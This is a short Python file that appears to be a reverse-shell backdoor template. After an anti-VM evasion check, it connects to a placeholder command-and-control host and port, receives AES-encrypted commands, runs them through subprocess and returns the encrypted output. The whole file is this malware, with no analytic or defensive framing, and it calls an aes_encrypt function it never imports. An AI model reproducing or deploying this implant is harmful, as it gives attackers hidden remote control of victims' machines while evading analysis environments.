import socket, subprocess, base64
from utils.encryption import aes_decrypt
from utils.evasion import anti_vm_check

def connect():
    if not anti_vm_check():
        return
    s = socket.socket()
    s.connect(("{{C2_HOST}}", {{C2_PORT}}))
    while True:
        command = aes_decrypt(s.recv(1024)).decode()
        if command.lower() == "exit":
            break
        output = subprocess.getoutput(command)
        s.send(aes_encrypt(output.encode()))
    s.close()

if __name__ == "__main__":
    connect()
